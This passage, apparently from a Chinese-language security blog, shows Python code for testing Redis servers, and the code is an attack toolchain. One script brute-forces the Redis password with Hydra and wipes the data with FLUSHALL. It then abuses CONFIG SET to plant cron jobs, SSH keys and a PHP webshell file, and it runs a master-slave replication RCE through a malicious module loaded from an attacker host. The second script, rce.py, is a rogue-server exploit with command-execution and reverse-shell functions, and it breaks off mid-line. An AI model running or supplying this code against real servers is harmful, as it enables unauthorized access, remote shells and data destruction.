class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> subprocess<br><br>exp_file = <span class="hljs-string">&quot;/home/kali/workfeild/exp.so&quot;</span>  <span class="hljs-comment"># 恶意模块路径</span><br>lhost = <span class="hljs-string">&quot;192.168.198.134&quot;</span>  <span class="hljs-comment"># 恶意服务器地址</span><br>password_file = <span class="hljs-string">&quot;/home/kali/password/top1000.txt&quot;</span>  <span class="hljs-comment"># 密码字典文件路径</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connection</span>(<span class="hljs-params">host, port, password</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    尝试连接到Redis服务器，如果连接成功返回True，否则返回False。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br>        client.ping()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> redis.exceptions.ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> redis.exceptions.AuthenticationError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] Redis服务器需要身份验证&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_passwords</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从 Hydra 输出文件中提取密码。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    passwords = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;password:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                password = line.split(<span class="hljs-string">&quot;password:&quot;</span>)[<span class="hljs-number">1</span>].strip()<br>                passwords.append(password)<br>    <span class="hljs-keyword">return</span> passwords<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_redis_password</span>(<span class="hljs-params">host, password_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用Hydra进行Redis密码爆破。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> password_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] 未提供Hydra密码文件路径&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    command = [<br>        <span class="hljs-string">&quot;hydra&quot;</span>,<br>        host,<br>        <span class="hljs-string">&quot;redis&quot;</span>,<br>        <span class="hljs-string">&quot;-P&quot;</span>,<br>        password_file,<br>        <span class="hljs-string">&quot;-e&quot;</span>,<br>        <span class="hljs-string">&quot;ns&quot;</span>,<br>        <span class="hljs-string">&quot;-f&quot;</span>,<br>        <span class="hljs-string">&quot;-o&quot;</span>,<br>        <span class="hljs-string">&quot;redis.txt&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">try</span>:<br>        subprocess.run(command, check=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;redis.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            lines = f.readlines()<br>            <span class="hljs-keyword">if</span> lines:<br>                <span class="hljs-keyword">pass</span><br>                <span class="hljs-comment"># print(&quot;[WARNING] Hydra密码破解成功！发现弱密码，请加强密码安全！&quot;)</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码破解未找到有效密码&quot;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] 运行Hydra时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redis_rce</span>(<span class="hljs-params">rhost, lhost, exp_file, auth</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    测试Redis是否易受RCE攻击。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    command = <span class="hljs-string">f&quot;python3 /home/kali/workfeild/rce.py -r <span class="hljs-subst">&#123;rhost&#125;</span> -L <span class="hljs-subst">&#123;lhost&#125;</span> -f <span class="hljs-subst">&#123;exp_file&#125;</span> -a <span class="hljs-subst">&#123;auth&#125;</span>&quot;</span><br>    process = subprocess.run(command, shell=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Exploit Success!&quot;</span> <span class="hljs-keyword">in</span> process.stdout.decode():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] Redis RCE 攻击成功： <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] Redis RCE攻击失败： <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_cron_getshell</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入计划任务</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\n* * * * 1  date&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/var/spool/cron&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入计划任务命令已成功执行！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入计划任务命令执行失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_sshkeygen</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入ssh-keygen</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\nid_rsa.pub\n\n&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/root/.ssh&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;test_authorized_keys&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 成功写入ssh公钥！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入ssh公钥失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_web_getshell</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入网站绝对路径</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\nphp\n\n&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/var/www/html/&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;shell.php.test&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 网站目录写入php漏洞脚本成功！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 网站目录写入php漏洞脚本失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_security</span>(<span class="hljs-params"></span><br><span class="hljs-params">    host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span>, password_file=<span class="hljs-literal">None</span></span><br><span class="hljs-params"></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查Redis服务器的安全性。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 尝试连接到Redis服务器</span><br>    passwordlist = [<span class="hljs-string">&quot;password&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_redis_connection(host, port, password):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 无法连接到Redis服务器，尝试使用Hydra进行暴力破解&quot;</span>)<br>        brute_force_redis_password(host, password_file)<br>        passwordlist = extract_passwords(<span class="hljs-string">&quot;/home/kali/workfeild/redis.txt&quot;</span>)<br>        <span class="hljs-keyword">if</span> passwordlist != []:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码爆破成功&quot;</span>)<br>            password = passwordlist[-<span class="hljs-number">1</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;破解的密码: <span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码爆破失败&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 检查是否设置了密码</span><br>        <span class="hljs-keyword">if</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> passwordlist == []:<br>            <span class="hljs-built_in">print</span>(<br>                <span class="hljs-string">&quot;[INFO] 设置了密码，尝试使用Hydra进行暴力破解失败，若需要进一步测试可手动输入密码&quot;</span><br>            )<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">elif</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 未设置密码&quot;</span>)<br>        <span class="hljs-comment"># 获取Redis信息</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br>        <span class="hljs-comment"># info = client.info()</span><br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否响应PING命令&quot;)</span><br>        <span class="hljs-comment"># if client.ping():</span><br>        <span class="hljs-comment">#     print(&quot;[INFO] Redis服务器可以访问且响应PING命令&quot;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入ssh公钥&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_sshkeygen(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis成功篡改ssh公钥&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis篡改ssh公钥&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_web_getshell(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入cron漏洞脚本&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_cron_getshell(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis服务器写入一个计划任务反弹shell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis服务器写入计划任务反弹shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-keyword">if</span> test_redis_rce(host, lhost, exp_file, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 成功利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否开启protected-mode&quot;)</span><br>        <span class="hljs-comment"># if client.config_get(&quot;protected-mode&quot;)[1] == &quot;yes&quot;:</span><br>        <span class="hljs-comment">#     print(&quot;[DONE] Redis服务器开启protected-mode&quot;)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(&quot;[FATAL] Redis服务器未开启protected-mode&quot;)</span><br><br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否绑定特定IP地址&quot;)</span><br>        <span class="hljs-comment"># if client.config_get(&quot;bind&quot;)[1] == &quot;&quot;:</span><br>        <span class="hljs-comment">#     print(&quot;[INFO] Redis服务器未绑定特定IP地址&quot;)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(f&quot;[DONE] Redis服务器绑定IP地址：&#123;client.config_get(&#x27;bind&#x27;)[1]&#125;&quot;)</span><br><br>    <span class="hljs-keyword">except</span> redis.exceptions.ResponseError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] Redis响应错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;检查Redis的安全性&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--host&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器地址&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">6379</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器端口&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--password&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器密码&quot;</span>)<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-comment"># 进行安全检查</span><br>    check_redis_security(<br>        host=args.host,<br>        port=args.port,<br>        password=args.password,<br>        password_file=password_file,<br>    )<br><br></code></pre></td></tr></table></figure><p>rce.py</p><p>基于GitHub开源代码修改<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>CLRF = <span class="hljs-string">&quot;\r\n&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_cmd_arr</span>(<span class="hljs-params">arr</span>):<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arr))<br>    <span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> arr:<br>        cmd += CLRF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arg))<br>        cmd += CLRF + arg<br>    cmd += <span class="hljs-string">&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> cmd<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_cmd</span>(<span class="hljs-params">raw_cmd</span>):<br>    <span class="hljs-keyword">return</span> mk_cmd_arr(raw_cmd.split(<span class="hljs-string">&quot; &quot;</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">din</span>(<span class="hljs-params">sock, cnt</span>):<br>    msg = sock.recv(cnt)<br>    <span class="hljs-keyword">return</span> msg.decode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dout</span>(<span class="hljs-params">sock, msg</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(msg) != <span class="hljs-built_in">bytes</span>:<br>        msg = msg.encode()<br>    sock.send(msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_shell_result</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\n&quot;</span>.join(s.split(<span class="hljs-string">&quot;\r\n&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, rhost, rport</span>):<br>        self._host = rhost<br>        self._port = rport<br>        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self._sock.connect((self._host, self._port))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg</span>):<br>        dout(self._sock, msg)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, cnt=<span class="hljs-number">65535</span></span>):<br>        <span class="hljs-keyword">return</span> din(self._sock, cnt)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">self, cmd</span>):<br>        self.send(mk_cmd(cmd))<br>        buf = self.recv()<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        self._sock.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">shell_cmd</span>(<span class="hljs-params">self, cmd</span>):<br>        self.send(mk_cmd_arr([<span class="hljs-string">&#x27;system.exec&#x27;</span>, <span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(cmd)]))<br>        buf = self.recv()<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_shell</span>(<span class="hljs-params">self, addr, port</span>):<br>        self.send(mk_cmd(<span class="hljs-string">&quot;system.rev &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr, port)))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RogueServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, lhost, lport, remote, file</span>):<br>        self._host = lhost<br>        self._port = lport<br>        self._remote = remote<br>        self._file = file<br>        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self._sock.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, self._port))<br>        self._sock.settimeout(<span class="hljs-number">15</span>)<br>        self._sock.listen(<span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self, data</span>):<br>        resp = <span class="hljs-string">&quot;&quot;</span><br>        phase = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> data.find(<span class="hljs-string">&quot;PING&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+PONG&quot;</span> + CLRF<br>            phase = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;REPLCONF&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+OK&quot;</span> + CLRF<br>            phase = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;AUTH&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+OK&quot;</span> + CLRF<br>            phase = <span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;PSYNC&quot;</span>) &gt; -<span class="hljs-number">1</span> <span 